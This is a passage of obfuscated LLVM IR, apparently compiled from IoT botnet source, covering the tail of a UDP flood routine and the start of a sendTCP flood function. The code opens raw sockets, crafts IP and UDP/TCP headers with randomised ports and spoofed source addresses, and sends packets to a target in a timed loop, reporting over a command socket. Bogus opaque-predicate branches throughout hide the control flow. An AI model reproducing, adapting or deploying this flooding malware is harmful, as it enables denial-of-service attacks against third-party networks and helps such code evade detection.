  store %struct.iphdr* %299, %struct.iphdr** %38, align 8
  %300 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %301 = bitcast %struct.iphdr* %300 to i8*
  %302 = getelementptr i8, i8* %301, i64 20
  %303 = bitcast i8* %302 to %struct.udphdr*
  store %struct.udphdr* %303, %struct.udphdr** %39, align 8
  %304 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %305 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %306 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 4
  %308 = load i32, i32* %36, align 4
  %309 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %308)
  %310 = call i32 @htonl(i32 %309) #13
  %311 = load i32, i32* %21, align 4
  %312 = sext i32 %311 to i64
  %313 = add i64 8, %312
  %314 = trunc i64 %313 to i32
  call void @makeIPPacket(%struct.iphdr* %304, i32 %307, i32 %310, i8 zeroext 17, i32 %314)
  %315 = load i32, i32* %21, align 4
  %316 = sext i32 %315 to i64
  %317 = add i64 8, %316
  %318 = trunc i64 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #13
  %320 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.3* %321 to %struct.anon.4*
  %323 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %322, i32 0, i32 2
  store i16 %319, i16* %323, align 2
  %324 = call i32 @rand_cmwc()
  %325 = trunc i32 %324 to i16
  %326 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon.3* %327 to %struct.anon.4*
  %329 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %328, i32 0, i32 0
  store i16 %325, i16* %329, align 2
  %330 = load i32, i32* %18, align 4
  %331 = icmp eq i32 %330, 0
  br i1 %331, label %332, label %334

; <label>:332:                                    ; preds = %293
  %333 = call i32 @rand_cmwc()
  br label %339

; <label>:334:                                    ; preds = %293
  %335 = load i32, i32* %18, align 4
  %336 = trunc i32 %335 to i16
  %337 = call zeroext i16 @htons(i16 zeroext %336) #13
  %338 = zext i16 %337 to i32
  br label %339

; <label>:339:                                    ; preds = %334, %332
  %340 = phi i32 [ %333, %332 ], [ %338, %334 ]
  %341 = load i32, i32* @x.89
  %342 = load i32, i32* @y.90
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %339
  %349 = trunc i32 %340 to i16
  %350 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon.3* %351 to %struct.anon.4*
  %353 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %352, i32 0, i32 1
  store i16 %349, i16* %353, align 2
  %354 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %355 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon.3* %355 to %struct.anon.4*
  %357 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %356, i32 0, i32 3
  store i16 0, i16* %357, align 2
  %358 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %359 = bitcast %struct.udphdr* %358 to i8*
  %360 = getelementptr inbounds i8, i8* %359, i64 8
  %361 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %360, i32 %361)
  %362 = bitcast i8* %298 to i16*
  %363 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 2
  %365 = load i16, i16* %364, align 2
  %366 = zext i16 %365 to i32
  %367 = call zeroext i16 @csum(i16* %362, i32 %366)
  %368 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i16 %367, i16* %369, align 2
  %370 = call i64 @time(i64* null) #2
  %371 = load i32, i32* %19, align 4
  %372 = sext i32 %371 to i64
  %373 = add nsw i64 %370, %372
  %374 = trunc i64 %373 to i32
  store i32 %374, i32* %40, align 4
  store i32 0, i32* %41, align 4
  store i32 0, i32* %42, align 4
  %375 = load i32, i32* @x.89
  %376 = load i32, i32* @y.90
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart246, label %originalBB38alteredBB

originalBBpart246:                                ; preds = %originalBB38
  br label %383

; <label>:383:                                    ; preds = %originalBBpart282, %originalBBpart270, %487, %originalBBpart246
  %384 = load i32, i32* @x.89
  %385 = load i32, i32* @y.90
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %383
  %392 = load i32, i32* @x.89
  %393 = load i32, i32* @y.90
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %400

; <label>:400:                                    ; preds = %originalBBpart250
  %401 = load i32, i32* %33, align 4
  %402 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %403 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %403, %struct.sockaddr** %402, align 8
  %404 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %405 = load %struct.sockaddr*, %struct.sockaddr** %404, align 8
  %406 = call i64 @sendto(i32 %401, i8* %298, i64 %296, i32 0, %struct.sockaddr* %405, i32 16)
  %407 = call i32 @rand_cmwc()
  %408 = trunc i32 %407 to i16
  %409 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %410 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %409, i32 0, i32 0
  %411 = bitcast %union.anon.3* %410 to %struct.anon.4*
  %412 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %411, i32 0, i32 0
  store i16 %408, i16* %412, align 2
  %413 = load i32, i32* %18, align 4
  %414 = icmp eq i32 %413, 0
  br i1 %414, label %415, label %433

; <label>:415:                                    ; preds = %400
  %416 = load i32, i32* @x.89
  %417 = load i32, i32* @y.90
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %415
  %424 = call i32 @rand_cmwc()
  %425 = load i32, i32* @x.89
  %426 = load i32, i32* @y.90
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %454

; <label>:433:                                    ; preds = %400
  %434 = load i32, i32* @x.89
  %435 = load i32, i32* @y.90
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %433
  %442 = load i32, i32* %18, align 4
  %443 = trunc i32 %442 to i16
  %444 = call zeroext i16 @htons(i16 zeroext %443) #13
  %445 = zext i16 %444 to i32
  %446 = load i32, i32* @x.89
  %447 = load i32, i32* @y.90
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %454

; <label>:454:                                    ; preds = %originalBBpart258, %originalBBpart254
  %455 = phi i32 [ %424, %originalBBpart254 ], [ %445, %originalBBpart258 ]
  %456 = trunc i32 %455 to i16
  %457 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %458 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %457, i32 0, i32 0
  %459 = bitcast %union.anon.3* %458 to %struct.anon.4*
  %460 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %459, i32 0, i32 1
  store i16 %456, i16* %460, align 2
  %461 = call i32 @rand_cmwc()
  %462 = trunc i32 %461 to i16
  %463 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 3
  store i16 %462, i16* %464, align 4
  %465 = load i32, i32* %36, align 4
  %466 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %465)
  %467 = call i32 @htonl(i32 %466) #13
  %468 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 8
  store i32 %467, i32* %469, align 4
  %470 = bitcast i8* %298 to i16*
  %471 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 2
  %473 = load i16, i16* %472, align 2
  %474 = zext i16 %473 to i32
  %475 = call zeroext i16 @csum(i16* %470, i32 %474)
  %476 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 7
  store i16 %475, i16* %477, align 2
  %478 = load i32, i32* %41, align 4
  %479 = load i32, i32* %26, align 4
  %480 = icmp eq i32 %478, %479
  br i1 %480, label %481, label %488

; <label>:481:                                    ; preds = %454
  %482 = call i64 @time(i64* null) #2
  %483 = load i32, i32* %40, align 4
  %484 = sext i32 %483 to i64
  %485 = icmp sgt i64 %482, %484
  br i1 %485, label %486, label %487

; <label>:486:                                    ; preds = %481
  br label %533

; <label>:487:                                    ; preds = %481
  store i32 0, i32* %41, align 4
  br label %383

; <label>:488:                                    ; preds = %454
  %489 = load i32, i32* %41, align 4
  %490 = add i32 %489, 1
  store i32 %490, i32* %41, align 4
  %491 = load i32, i32* %42, align 4
  %492 = load i32, i32* %23, align 4
  %493 = icmp eq i32 %491, %492
  br i1 %493, label %494, label %514

; <label>:494:                                    ; preds = %488
  %495 = load i32, i32* @x.89
  %496 = load i32, i32* @y.90
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %494
  %503 = load i32, i32* %24, align 4
  %504 = mul nsw i32 %503, 1000
  %505 = call i32 @usleep(i32 %504)
  store i32 0, i32* %42, align 4
  %506 = load i32, i32* @x.89
  %507 = load i32, i32* @y.90
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart270, label %originalBB60alteredBB

originalBBpart270:                                ; preds = %originalBB60
  br label %383

; <label>:514:                                    ; preds = %488
  %515 = load i32, i32* @x.89
  %516 = load i32, i32* @y.90
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %514
  %523 = load i32, i32* %42, align 4
  %524 = add i32 %523, 1
  store i32 %524, i32* %42, align 4
  %525 = load i32, i32* @x.89
  %526 = load i32, i32* @y.90
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart282, label %originalBB72alteredBB

originalBBpart282:                                ; preds = %originalBB72
  br label %383

; <label>:533:                                    ; preds = %486
  %534 = load i8*, i8** %37, align 8
  call void @llvm.stackrestore(i8* %534)
  br label %535

; <label>:535:                                    ; preds = %533, %236, %212, %originalBBpart216, %106, %80, %69
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %536 = alloca i8*, align 8
  %537 = alloca i32, align 4
  %538 = alloca i32, align 4
  %539 = alloca i32, align 4
  %540 = alloca i32, align 4
  %541 = alloca i32, align 4
  %542 = alloca i32, align 4
  %543 = alloca i32, align 4
  %544 = alloca %struct.sockaddr_in, align 4
  %545 = alloca i32, align 4
  %546 = alloca i32, align 4
  %547 = alloca i8*, align 8
  %548 = alloca i32, align 4
  %549 = alloca i32, align 4
  %550 = alloca i32, align 4
  %551 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %552 = alloca i32, align 4
  %553 = alloca i32, align 4
  %554 = alloca i32, align 4
  %555 = alloca i32, align 4
  %556 = alloca i8*, align 8
  %557 = alloca %struct.iphdr*, align 8
  %558 = alloca %struct.udphdr*, align 8
  %559 = alloca i32, align 4
  %560 = alloca i32, align 4
  %561 = alloca i32, align 4
  %562 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %536, align 8
  store i32 %1, i32* %537, align 4
  store i32 %2, i32* %538, align 4
  store i32 %3, i32* %539, align 4
  store i32 %4, i32* %540, align 4
  store i32 %5, i32* %541, align 4
  store i32 %6, i32* %542, align 4
  store i32 %7, i32* %543, align 4
  %563 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %544, i32 0, i32 0
  store i16 2, i16* %563, align 4
  %564 = load i32, i32* %537, align 4
  %565 = icmp eq i32 %564, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %83
  %566 = load i32, i32* %21, align 4
  %_ = sub i32 0, %566
  %gen = add i32 %_, 1
  %_2 = shl i32 %566, 1
  %_3 = shl i32 %566, 1
  %_4 = shl i32 %566, 1
  %_5 = sub i32 %566, 1
  %gen6 = mul i32 %_5, 1
  %567 = add nsw i32 %566, 1
  %568 = sext i32 %567 to i64
  %569 = call noalias i8* @malloc(i64 %568) #2
  store i8* %569, i8** %28, align 8
  %570 = load i8*, i8** %28, align 8
  %571 = icmp eq i8* %570, null
  br label %originalBB1

originalBB10alteredBB:                            ; preds = %originalBB10, %119
  %572 = load i32, i32* %27, align 4
  %573 = load i8*, i8** %28, align 8
  %574 = load i32, i32* %21, align 4
  %575 = sext i32 %574 to i64
  %576 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %577 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %577, %struct.sockaddr** %576, align 8
  %578 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %579 = load %struct.sockaddr*, %struct.sockaddr** %578, align 8
  %580 = call i64 @sendto(i32 %572, i8* %573, i64 %575, i32 0, %struct.sockaddr* %579, i32 16)
  %581 = load i32, i32* %30, align 4
  %582 = load i32, i32* %26, align 4
  %583 = icmp eq i32 %581, %582
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %175
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %192
  %584 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %584, i32* %33, align 4
  %585 = load i32, i32* %33, align 4
  %586 = icmp ne i32 %585, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %215
  store i32 1, i32* %34, align 4
  %587 = load i32, i32* %33, align 4
  %588 = bitcast i32* %34 to i8*
  %589 = call i32 @setsockopt(i32 %587, i32 0, i32 3, i8* %588, i32 4) #2
  %590 = icmp slt i32 %589, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %239
  store i32 50, i32* %35, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %256
  %591 = load i32, i32* %35, align 4
  %_31 = sub i32 %591, -1
  %gen32 = mul i32 %_31, -1
  %_33 = sub i32 %591, -1
  %gen34 = mul i32 %_33, -1
  %592 = add nsw i32 %591, -1
  store i32 %592, i32* %35, align 4
  %593 = icmp ne i32 %591, 0
  br label %originalBB30

originalBB38alteredBB:                            ; preds = %originalBB38, %339
  %594 = trunc i32 %340 to i16
  %595 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %596 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %595, i32 0, i32 0
  %597 = bitcast %union.anon.3* %596 to %struct.anon.4*
  %598 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %597, i32 0, i32 1
  store i16 %594, i16* %598, align 2
  %599 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %600 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %599, i32 0, i32 0
  %601 = bitcast %union.anon.3* %600 to %struct.anon.4*
  %602 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %601, i32 0, i32 3
  store i16 0, i16* %602, align 2
  %603 = load %struct.udphdr*, %struct.udphdr** %39, align 8
  %604 = bitcast %struct.udphdr* %603 to i8*
  %605 = getelementptr inbounds i8, i8* %604, i64 8
  %606 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %605, i32 %606)
  %607 = bitcast i8* %298 to i16*
  %608 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 2
  %610 = load i16, i16* %609, align 2
  %611 = zext i16 %610 to i32
  %612 = call zeroext i16 @csum(i16* %607, i32 %611)
  %613 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %614 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %613, i32 0, i32 7
  store i16 %612, i16* %614, align 2
  %615 = call i64 @time(i64* null) #2
  %616 = load i32, i32* %19, align 4
  %617 = sext i32 %616 to i64
  %_39 = sub i64 %615, %617
  %gen40 = mul i64 %_39, %617
  %_41 = sub i64 0, %615
  %gen42 = add i64 %_41, %617
  %_43 = sub i64 0, %615
  %gen44 = add i64 %_43, %617
  %618 = add nsw i64 %615, %617
  %619 = trunc i64 %618 to i32
  store i32 %619, i32* %40, align 4
  store i32 0, i32* %41, align 4
  store i32 0, i32* %42, align 4
  br label %originalBB38

originalBB48alteredBB:                            ; preds = %originalBB48, %383
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %415
  %620 = call i32 @rand_cmwc()
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %433
  %621 = load i32, i32* %18, align 4
  %622 = trunc i32 %621 to i16
  %623 = call zeroext i16 @htons(i16 zeroext %622) #13
  %624 = zext i16 %623 to i32
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %494
  %625 = load i32, i32* %24, align 4
  %_61 = shl i32 %625, 1000
  %_62 = shl i32 %625, 1000
  %_63 = sub i32 %625, 1000
  %gen64 = mul i32 %_63, 1000
  %_65 = sub i32 %625, 1000
  %gen66 = mul i32 %_65, 1000
  %_67 = sub i32 0, %625
  %gen68 = add i32 %_67, 1000
  %626 = mul nsw i32 %625, 1000
  %627 = call i32 @usleep(i32 %626)
  store i32 0, i32* %42, align 4
  br label %originalBB60

originalBB72alteredBB:                            ; preds = %originalBB72, %514
  %628 = load i32, i32* %42, align 4
  %_73 = sub i32 %628, 1
  %gen74 = mul i32 %_73, 1
  %_75 = sub i32 %628, 1
  %gen76 = mul i32 %_75, 1
  %_77 = sub i32 0, %628
  %gen78 = add i32 %_77, 1
  %_79 = sub i32 %628, 1
  %gen80 = mul i32 %_79, 1
  %629 = add i32 %628, 1
  store i32 %629, i32* %42, align 4
  br label %originalBB72
}

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.91
  %9 = load i32, i32* @y.92
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %35 = load i32, i32* %22, align 4
  store i32 %35, i32* %23, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %17, align 4
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.91
  %40 = load i32, i32* @y.92
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %51

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %49, i16* %50, align 2
  br label %72

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* @x.91
  %53 = load i32, i32* @y.92
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %51
  %60 = load i32, i32* %17, align 4
  %61 = trunc i32 %60 to i16
  %62 = call zeroext i16 @htons(i16 zeroext %61) #13
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %62, i16* %63, align 2
  %64 = load i32, i32* @x.91
  %65 = load i32, i32* @y.92
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:72:                                     ; preds = %originalBBpart24, %47
  %73 = load i32, i32* @x.91
  %74 = load i32, i32* @y.92
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %72
  %81 = load i8*, i8** %16, align 8
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %83 = call i32 @getHost(i8* %81, %struct.in_addr* %82)
  %84 = icmp ne i32 %83, 0
  %85 = load i32, i32* @x.91
  %86 = load i32, i32* @y.92
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %84, label %93, label %110

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i32, i32* @x.91
  %95 = load i32, i32* @y.92
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i32, i32* @x.91
  %103 = load i32, i32* @y.92
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %634

; <label>:110:                                    ; preds = %originalBBpart28
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %112 = getelementptr inbounds [8 x i8], [8 x i8]* %111, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %112, i8 0, i64 8, i32 4, i1 false)
  %113 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %113, i32* %25, align 4
  %114 = load i32, i32* %25, align 4
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %119, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %634

; <label>:119:                                    ; preds = %110
  store i32 1, i32* %26, align 4
  %120 = load i32, i32* %25, align 4
  %121 = bitcast i32* %26 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #2
  %123 = icmp slt i32 %122, 0
  br i1 %123, label %124, label %143

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* @x.91
  %126 = load i32, i32* @y.92
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %124
  %133 = load i32, i32* @mainCommSock, align 4
  %134 = call i32 (i32, i8*, ...) @sockprintf(i32 %133, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  %135 = load i32, i32* @x.91
  %136 = load i32, i32* @y.92
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %634

; <label>:143:                                    ; preds = %119
  %144 = load i32, i32* @x.91
  %145 = load i32, i32* @y.92
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %143
  %152 = load i32, i32* %19, align 4
  %153 = icmp eq i32 %152, 0
  %154 = load i32, i32* @x.91
  %155 = load i32, i32* @y.92
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %153, label %162, label %179

; <label>:162:                                    ; preds = %originalBBpart220
  %163 = load i32, i32* @x.91
  %164 = load i32, i32* @y.92
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
